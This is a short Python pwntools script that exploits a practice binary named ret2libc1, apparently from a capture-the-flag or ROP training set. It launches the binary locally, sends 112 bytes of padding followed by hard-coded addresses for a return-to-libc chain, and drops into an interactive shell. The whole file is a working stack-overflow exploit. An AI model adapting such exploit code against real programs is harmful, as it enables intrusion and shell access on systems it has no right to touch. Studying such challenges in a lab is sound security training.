from pwn import *


def ret2_libc1_1(file_name='/mnt/hgfs/Cyber Security PWN/ROP/ret2libc1'):
    print('call ret2libc1 start')
    try:
        print(file_name)
        io = process([file_name])

        payload = b'A' * 112 + p32(0x08048460) + p32(0x0) + p32(0x08048720)

        io.recvline()
        io.sendline(payload)

        io.interactive()
    except Exception:
        return False
    finally:
        print('call ret2libc1 end\n\n')

    return True


if __name__ == '__main__':
    ret2_libc1_1()
